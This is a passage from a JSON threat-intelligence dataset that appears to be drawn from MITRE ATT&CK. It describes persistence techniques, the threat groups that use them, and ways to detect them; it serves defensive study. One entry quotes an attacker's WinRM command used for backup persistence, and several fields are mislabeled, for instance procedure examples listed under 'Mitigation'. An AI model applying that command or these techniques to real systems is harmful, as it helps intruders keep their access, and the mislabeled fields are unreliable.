        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor newly constructed files that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Metadata",
        "detects": "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, etc."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events."
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Tools such as Sysinternals Autoruns can be used to detect changes to execution triggers that could be attempts at persistence. Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes made to windows registry keys and/or values that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events."
      },
      {
        "id": "DS0005",
        "dsource": "WMI",
        "dcomp": "WMI Creation",
        "detects": "Monitor for newly constructed WMI Objects that may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1546.001",
        "name": "Change Default File Association"
      },
      {
        "id": "T1546.002",
        "name": "Screensaver"
      },
      {
        "id": "T1546.003",
        "name": "Windows Management Instrumentation Event Subscription"
      },
      {
        "id": "T1546.004",
        "name": "Unix Shell Configuration Modification"
      },
      {
        "id": "T1546.005",
        "name": "Trap"
      },
      {
        "id": "T1546.006",
        "name": "LC_LOAD_DYLIB Addition"
      },
      {
        "id": "T1546.007",
        "name": "Netsh Helper DLL"
      },
      {
        "id": "T1546.008",
        "name": "Accessibility Features"
      },
      {
        "id": "T1546.009",
        "name": "AppCert DLLs"
      },
      {
        "id": "T1546.010",
        "name": "AppInit DLLs"
      },
      {
        "id": "T1546.011",
        "name": "Application Shimming"
      },
      {
        "id": "T1546.012",
        "name": "Image File Execution Options Injection"
      },
      {
        "id": "T1546.013",
        "name": "PowerShell Profile"
      },
      {
        "id": "T1546.014",
        "name": "Emond"
      },
      {
        "id": "T1546.015",
        "name": "Component Object Model Hijacking"
      },
      {
        "id": "T1546.016",
        "name": "Installer Packages"
      }
    ],
    "Tactic": "PrivilegeEscalation, Persistence"
  },
  {
    "Title": "External Remote Services",
    "Code": "T1133",
    "Description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.[1]Access to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.[2] Access to remote services may be used as a redundant or persistent access mechanism during an operation.Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.[3][4]",
    "Mitigation": [
      {
        "id": "C0028",
        "name": "2015 Ukraine Electric Power Attack",
        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a modified Dropbear SSH client as the backdoor to target systems. [5]"
      },
      {
        "id": "G0026",
        "name": "APT18",
        "description": "APT18 actors leverage legitimate credentials to log into external remote services.[6]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has used Tor and a variety of commercial VPN services to route brute force authentication attempts.[7]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has used compromised identities to access networks via VPNs and Citrix.[8][9]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service.[10]"
      },
      {
        "id": "C0027",
        "name": "C0027",
        "description": "During C0027, Scattered Spider used Citrix and VPNs to persist in compromised environments.[11]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used legitimate credentials to login to an external VPN, Citrix, SSH, and other remote services.[12][13]"
      },
      {
        "id": "C0004",
        "name": "CostaRicto",
        "description": "During CostaRicto, the threat actors set up remote tunneling using an SSH tool to maintain access to a compromised environment.[14]"
      },
      {
        "id": "S0600",
        "name": "Doki",
        "description": "Doki was executed through an open Docker daemon API port.[15]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.[16][17]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has gained access to compromised environments via remote access services such as the corporate virtual private network (VPN).[18]"
      },
      {
        "id": "G0053",
        "name": "FIN5",
        "description": "FIN5 has used legitimate VPN, Citrix, or VNC credentials to maintain access to a victim environment.[19][20][21]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM has used VPN services, including SoftEther VPN, to access and maintain persistence in victim environments.[22][23]"
      },
      {
        "id": "G0115",
        "name": "GOLD SOUTHFIELD",
        "description": "GOLD SOUTHFIELD has used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines.[24]"
      },
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard was executed through an unsecure kubelet that allowed anonymous access to the victim environment.[4]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has gained access through VPNs including with compromised accounts and stolen VPN certificates.[25][26]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has used RDP to establish persistence.[27]"
      },
      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing was executed in an Ubuntu container deployed via an open Docker daemon API.[28]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has gained access to internet-facing systems and applications, including virtual private network (VPN), remote desktop protocol (RDP), and virtual desktop infrastructure (VDI) including Citrix. [29][30]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has used external remote services such as virtual private networks (VPN) to gain initial access.[31]"
      },
      {
        "id": "S0362",
        "name": "Linux Rabbit",
        "description": "Linux Rabbit attempts to gain access to the server via SSH.[32]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can establish an SSH connection from a compromised host to a server.[33]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems.[34]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig uses remote services such as VPN, Citrix, or OWA to persist in an environment.[35]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
        "description": "During Operation CuckooBees, the threat actors enabled WinRM over HTTP/HTTPS as a backup persistence mechanism using the following command: cscript //nologo \"C:\\Windows\\System32\\winrm.vbs\" set winrm/config/service@{EnableCompatibilityHttpsListener=\"true\"}.[36]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used stolen credentials to connect to the victim's network via VPN.[37]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network. Sandworm Team has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users.[38][39][40]"
      },
      {
        "id": "G1015",
        "name": "Scattered Spider",
        "description": "Scattered Spider has leveraged legitimate remote management tools to maintain persistent access.[41]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "For the SolarWinds Compromise, APT29 used compromised identities to access networks via SSH, VPNs, and other remote access tools.[42][43]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has used open-source tools such as Weave Scope to target exposed Docker API ports and gain initial access to victim environments.[44][45] TeamTNT has also targeted exposed kubelets for Kubernetes environments.[4]"
      },
      {
        "id": "G0088",
        "name": "TEMP.Veles",
        "description": "TEMP.Veles has used a VPN to persist in the victim environment.[46]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 actors look for and use VPN profiles during an operation to access the network using external VPN services.[47] Threat Group-3390 has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.[48]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure.[49]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "When authentication is not required to access an exposed remote service, monitor for follow-on activities such as anomalous external use of the exposed API or application."
      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Metadata",
        "detects": "Follow best practices for detecting adversary use of Valid Accounts for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that may use Valid Accounts to access and/or persist within a network using External Remote Services. Use of External Remote Services may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using External Remote Services."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware."
      }
    ],
    "Subtechniques": "Persistence, InitialAccess"
  },
  {
    "Title": "Hijack Execution Flow",
    "Code": "T1574",
    "Description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
    "Mitigation": [
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries.[1]"
      },
      {
        "id": "S0354",
        "name": "Denis",
        "description": "Denis replaces the nonexistent Windows DLL \"msfte.dll\" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe.[2]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "One of Dtrack can replace the normal flow of a program execution with malicious code.[3]"
      },
      {
        "id": "S0444",
        "name": "ShimRat",
        "description": "ShimRat can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may execute their own malicious payloads by hijacking the way operating systems run programs."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files that may execute their own malicious payloads by hijacking the way operating systems run programs."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious."
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates."
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Metadata",
        "detects": "Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes made to windows registry keys and/or values that may execute their own malicious payloads by hijacking the way operating systems run programs."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1574.001",
        "name": "DLL Search Order Hijacking"
      },
      {
        "id": "T1574.002",
        "name": "DLL Side-Loading"
      },
      {
        "id": "T1574.004",
        "name": "Dylib Hijacking"
      },
      {
        "id": "T1574.005",
        "name": "Executable Installer File Permissions Weakness"
      },
      {
        "id": "T1574.006",
        "name": "Dynamic Linker Hijacking"
      },
      {
        "id": "T1574.007",
        "name": "Path Interception by PATH Environment Variable"
      },
      {
        "id": "T1574.008",
        "name": "Path Interception by Search Order Hijacking"
      },
      {
        "id": "T1574.009",
        "name": "Path Interception by Unquoted Path"
      },
      {
        "id": "T1574.010",
        "name": "Services File Permissions Weakness"
      },
      {
        "id": "T1574.011",
        "name": "Services Registry Permissions Weakness"
      },
      {
        "id": "T1574.012",
        "name": "COR_PROFILER"
      },
      {
        "id": "T1574.013",
        "name": "KernelCallbackTable"
      }
    ],
    "Tactic": "Persistence, PrivilegeEscalation, DefenseEvasion"
  },
  {
    "Title": "Implant Internal Image",
    "Code": "T1525",
    "Description": "Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike Upload Malware, this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.[1]A tool has been developed to facilitate planting backdoors in cloud container images.[2] If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a Web Shell.[1]",
    "Mitigation": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": "Periodically check the integrity of images and containers used in cloud deployments to ensure they have not been modified to include malicious software."
      },
      {
        "id": "M1045",
        "name": "Code Signing",
        "description": "Several cloud service providers support content trust models that require container images be signed by trusted sources.[3][4]"
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Limit permissions associated with creating and modifying platform images or containers based on the principle of least privilege."
      }
    ],
    "Detection": [
      {
        "id": "DS0007",
        "dsource": "Image",
        "dcomp": "Image Creation",
        "detects": "Monitor interactions with images and containers by users to identify ones that are added anomalously."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Image Metadata",
        "detects": "Periodically baseline virtual machine images to identify malicious modifications or additions."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Image Modification",
        "detects": "Monitor interactions with images and containers by users to identify ones that are modified anomalously.In containerized environments, changes may be detectable by monitoring the Docker daemon logs or setting up and monitoring Kubernetes audit logs depending on registry configuration."
      }
    ],
    "Subtechniques": "\nPersistence"
  },
  {
    "Title": "Modify Authentication Process",
    "Code": "T1556",
    "Description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
    "Mitigation": [
      {
        "id": "S0377",
        "name": "Ebury",
        "description": "Ebury can intercept private keys using a trojanized ssh-add function.[1]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has replaced legitimate KeePass binaries with trojanized versions to collect passwords from numerous applications.[2]"
      },
      {
        "id": "S0487",
        "name": "Kessel",
        "description": "Kessel has trojanized the ssh_login and user-auth_pubkey functions to steal plaintext credentials.[3]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can create a backdoor in KeePass using a malicious config file and in TortoiseSVN using a registry hook.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Modification",
        "detects": "Monitor for changes made to AD security settings related to MFA logon requirements, such as changes to Azure AD Conditional Access Policies or the registration of new MFA applications."
      },
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Enable security auditing to collect logs from hybrid identity solutions. For example, monitor sign-ins to the Azure AD Application Proxy Connector, which are typically generated only when a new Pass Through Authentication (PTA) Agent is added. [5] If AD FS is in use, review the logs for event ID 501, which specifies all EKU attributes on a claim, and raise alerts on any values that are not configured in your environment.[6]"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for suspicious additions to the /Library/Security/SecurityAgentPlugins directory.[13]Monitor for newly created files that may be used to register malicious network provider dynamic link libraries (DLLs)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for suspicious modification of files associated with authentication processes, such as configuration files and module paths (e.g. /etc/pam.d/). Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files. Also monitor for access to certificates and cryptographic keys material."
      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor for newly constructed logon behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access). Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.[14]"
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Password filters will also show up as an autorun and loaded DLL in lsass.exe.[15] If AD FS is in use, monitor the AD FS server for the creation of DLLs as well as the loading of unrecognized or unsigned DLLs into the Microsoft.IdentityServer.Servicehost application.[6]"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for calls to OpenProcess that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).[16]Monitor for abnormal API calls to NPLogonNotify() that may highlight malicious network provider DLLs.[17]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Access",
        "detects": "Monitor for unexpected processes interacting with authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Monitor for account authentications in which MFA credentials are not provided by the user account to the authenticating entity."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "User Account Modification",
        "detects": "Monitor for the enrollment of devices and user accounts with alternative security settings that do not require MFA credentials for successful logon."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Creation",
        "detects": "Monitor for the addition of network provider Registry keys (e.g., HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<NetworkProviderName>\\NetworkProvider)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes to Registry entries for password filters (ex: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages) and correlate then investigate the DLL files these files reference.Monitor for changes to Registry entries for network providers (e.g., HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order) and correlate then investigate the DLL files these values reference."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1556.001",
        "name": "Domain Controller Authentication"
      },
      {
        "id": "T1556.002",
        "name": "Password Filter DLL"
      },
      {
        "id": "T1556.003",
        "name": "Pluggable Authentication Modules"
      },
      {
        "id": "T1556.004",
        "name": "Network Device Authentication"
      },
      {
        "id": "T1556.005",
        "name": "Reversible Encryption"
      },
      {
        "id": "T1556.006",
        "name": "Multi-Factor Authentication"
      },
      {
        "id": "T1556.007",
        "name": "Hybrid Identity"
      },
      {
        "id": "T1556.008",
        "name": "Network Provider DLL"
      }
    ],
    "Tactic": "CredentialAccess, DefenseEvasion, Persistence"
  },
  {
    "Title": "Office Application Startup",
    "Code": "T1137",
    "Description": "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.[1] These persistence mechanisms can work within Outlook or be used through Office 365.[2]",
    "Mitigation": [
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 have replaced Microsoft Outlook's VbaProject.OTM file to install a backdoor macro for persistence.[3][4]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has inserted malicious macros into existing documents, providing persistence when they are reopened. Gamaredon Group has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the /altvba option, once the Application.Startup event is received.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor for third-party application logging, messaging, and/or other artifacts that may leverage Microsoft Office-based applications for persistence between startups. SensePost, whose tool Ruler can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.[11]"
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may leverage Microsoft Office-based applications for persistence between startups. Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.[12] SensePost, whose tool Ruler can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.[11]"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files that may leverage Microsoft Office-based applications for persistence between startups."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that may leverage Microsoft Office-based applications for persistence between startups."
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor newly executed processes that may leverage Microsoft Office-based applications for persistence between startups. Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Creation",
        "detects": "Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.[13][14]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.[13][14]"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1137.001",
        "name": "Office Template Macros"
      },
      {
        "id": "T1137.002",
        "name": "Office Test"
      },
      {
        "id": "T1137.003",
        "name": "Outlook Forms"
      },
      {
        "id": "T1137.004",
        "name": "Outlook Home Page"
      },
      {
        "id": "T1137.005",
        "name": "Outlook Rules"
      },
      {
        "id": "T1137.006",
        "name": "Add-ins"
      }
    ],
    "Tactic": "\nPersistence"
  },
  {
    "Title": "Power Settings",
    "Code": "T1653",
    "Description": "Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.[1]Adversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.[2][3]For example, powercfg controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down.[4] Adversaries may also extend system lock screen timeout settings.[5] Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.[6]Aware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.[7]",
    "Mitigation": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": "Periodically inspect systems for abnormal and unexpected power settings that may indicate malicious activty."
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor and inspect commands and arguments associated with manipulating the power settings of a system."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Modification",
        "detects": "Monitor for unexpected changes to configuration files associated with the power settings of a system."
      }
    ],
    "Subtechniques": "\nPersistence"
  },
  {
    "Title": "Pre-OS Boot",
    "Code": "T1542",
    "Description": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.[1]Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",
    "Mitigation": [
      {
        "id": "M1046",
        "name": "Boot Integrity",
        "description": "Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised. Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification. [2] [3]"
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to perform these actions"
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": "Patch the BIOS and EFI as necessary."
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments in command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration."
      },
      {
        "id": "DS0016",
        "dsource": "Drive",
        "dcomp": "Drive Modification",
        "detects": "Monitor for changes to MBR and VBR as they occur for indicators for suspicious activity and further analysis. Take snapshots of MBR and VBR and compare against known good samples."
      },
      {
        "id": "DS0027",
        "dsource": "Driver",
        "dcomp": "Driver Metadata",
        "detects": "Disk check, forensic utilities, and data from device drivers (i.e. processes and API calls) may reveal anomalies that warrant deeper investigation"
      },
      {
        "id": "DS0001",
        "dsource": "Firmware",
        "dcomp": "Firmware Modification",
        "detects": "Monitor for changes made on pre-OS boot mechanisms that can be manipulated for malicious purposes. Take snapshots of boot records and firmware and compare against known good images. Log changes to boot records, BIOS, and EFI"
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network device configuration and system image against a known-good version to discover unauthorized changes to system boot, startup configuration, or the running OS. The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. Disk check, forensic utilities, and data from device drivers (i.e. API calls) may reveal anomalies that warrant deeper investigation. [4]"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1542.001",
        "name": "System Firmware"
      },
      {
        "id": "T1542.002",
        "name": "Component Firmware"
      },
      {
        "id": "T1542.003",
        "name": "Bootkit"
      },
      {
        "id": "T1542.004",
        "name": "ROMMONkit"
      },
      {
        "id": "T1542.005",
        "name": "TFTP Boot"
      }
    ],
    "Tactic": "DefenseEvasion, Persistence"
  },
  {
    "Title": "Scheduled Task/Job",
    "Code": "T1053",
